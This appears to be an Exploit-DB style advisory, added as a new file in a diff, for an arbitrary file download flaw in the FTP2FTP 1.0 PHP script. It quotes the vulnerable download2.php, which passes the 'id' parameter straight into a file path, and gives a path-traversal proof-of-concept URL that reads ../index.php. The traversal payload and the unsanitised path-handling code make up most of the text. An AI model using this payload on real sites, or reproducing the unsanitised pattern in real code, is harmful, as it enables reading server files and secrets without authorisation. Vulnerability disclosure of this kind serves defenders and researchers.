@@ -1,0 +1,34 @@
+# Exploit Title: FTP2FTP 1.0 - Arbitrary File Download
+# Dork: N/A
+# Date: 18.07.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/ftp2ftp-server-to-server-file-transfer-php-script/21972395
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : The "download2.php" is vulnerable in the admin panel.
+The attacker can download and read all files known by the name via 'id' parameter.
+
+====================================================
+
+
+# Vuln file : /FTP2FTP/download2.php
+
+1.  <?php
+2.  $file = "tempFiles2/".$_GET['id'];
+3.
+4.
+5.  if (file_exists($file)) {
+6.     header('Content-Description: File Transfer');
+7.     header('Content-Type: application/octet-stream');
+8.     header('Content-Disposition: attachment; filename="'.basename($file).'"');
+9.     header('Expires: 0');
+10.    header('Cache-Control: must-revalidate');
+11.    header('Pragma: public');
+12.    header('Content-Length: ' . filesize($file));
+13.    readfile($file);
+14.    exit;
+15. }
+16. ?>
+
+# PoC : http://sitenet/FTP2FTP/download2.php?id=../index.php
